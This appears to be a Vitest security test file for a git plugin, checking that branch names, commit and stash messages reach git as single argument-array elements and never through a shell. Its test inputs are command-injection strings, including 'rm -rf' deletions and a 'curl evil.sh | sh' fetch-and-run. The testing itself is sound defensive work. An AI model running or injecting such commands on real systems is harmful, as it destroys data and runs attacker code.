// @timps-plugin/git — M67 security tests
// Proves the git tools run through execFileSync with argument arrays, so
// branch names / commit messages are never interpreted by a shell.

import { describe, it, expect, vi, afterEach } from 'vitest';
import { execFileSync, execSync } from 'child_process';
import plugin from './index.js';

vi.mock('child_process', () => {
  return {
    execFileSync: vi.fn(() => 'ok'),
    execSync: vi.fn(),
  };
});

const execFileSyncMock = vi.mocked(execFileSync);
const execSyncMock = vi.mocked(execSync);

afterEach(() => {
  execFileSyncMock.mockReset();
  execFileSyncMock.mockImplementation(() => 'ok');
  execSyncMock.mockReset();
});

async function call(tool: string, params: Record<string, unknown>) {
  const handler = plugin.tools?.[tool];
  if (!handler) throw new Error(`no such tool: ${tool}`);
  return handler(params, {} as never);
}

describe('M67 — git tools never invoke a shell', () => {
  it('git_branch passes name as a single argv element (no shell interpolation)', async () => {
    await call('git_branch', { name: 'x; rm -rf ~', create: true });
    expect(execFileSyncMock.mock.calls).toHaveLength(1);
    expect(execFileSyncMock.mock.calls[0][1]).toEqual(['checkout', '-b', 'x; rm -rf ~']);
  });

  it('git_branch without create uses checkout with the name as one argument', async () => {
    await call('git_branch', { name: 'x$(whoami)' });
    expect(execFileSyncMock.mock.calls[0][1]).toEqual(['checkout', 'x$(whoami)']);
  });

  it('git_commit passes message as a single argv element (no $(...) / backticks)', async () => {
    await call('git_commit', { message: 'feat: `id` $(touch /tmp/pwned)`' });
    expect(execFileSyncMock.mock.calls).toHaveLength(2);
    expect(execFileSyncMock.mock.calls[1][1]).toEqual(['commit', '-m', 'feat: `id` $(touch /tmp/pwned)`']);
  });

  it('git_push passes branch as a single argv element', async () => {
    await call('git_push', { branch: 'feat; curl evil.sh | sh' });
    expect(execFileSyncMock.mock.calls[0][1]).toEqual(['push', 'origin', 'feat; curl evil.sh | sh']);
  });

  it('git_push without branch resolves HEAD via separate argv call', async () => {
    execFileSyncMock.mockImplementationOnce(() => 'main').mockImplementationOnce(() => 'pushed');
    await call('git_push', {});
    expect(execFileSyncMock.mock.calls[0][1]).toEqual(['rev-parse', '--abbrev-ref', 'HEAD']);
    expect(execFileSyncMock.mock.calls[1][1]).toEqual(['push', 'origin', 'main']);
  });

  it('git_stash passes message as a single argv element', async () => {
    await call('git_stash', { action: 'push', message: 'wip $(rm -rf /)' });
    expect(execFileSyncMock.mock.calls[0][1]).toEqual(['stash', 'push', '-m', 'wip $(rm -rf /)']);
  });

  it('execSync is never used', async () => {
    await call('git_branch', { name: 'x; touch /tmp/m67-pwned', create: true });
    expect(execSyncMock).not.toHaveBeenCalled();
  });
});
